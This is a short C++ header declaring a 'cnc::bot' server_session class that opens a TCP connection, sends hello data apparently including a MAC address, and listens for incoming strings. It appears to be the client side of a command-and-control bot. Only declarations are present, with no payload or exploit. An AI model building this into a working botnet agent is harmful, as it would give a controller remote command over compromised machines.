#pragma once
#include <common/mac_addr.h>
#include <common/bot_send.h>
#include <boost/asio/io_context.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <optional>

namespace cnc { namespace bot {
	class server_session
	{
	public:
		enum class session_state
		{
			CLOSED,
			CONNECTING,
			CONNECTED,
			STOPPING
		};

		using session_type = common::bot_send::session_type;
		using socket_type = session_type::socket_type;
		template<class T>
		using awaitable_type = session_type::awaitable_type<T>;

	private:
		session_state m_state = session_state::CLOSED;
		common::bot_protocol::hello_data m_hello_data;

	protected:
		boost::asio::ip::tcp::socket m_socket;

	public:
		server_session(boost::asio::io_context &context);
		~server_session();

		session_state state() const noexcept { return m_state; }
		void close();

		awaitable_type<void> connect(socket_type::endpoint_type endpoint, const common::bot_protocol::hello_data &hello_data);
		awaitable_type<std::optional<std::string>> listen();
		void stop() noexcept;
	};
} }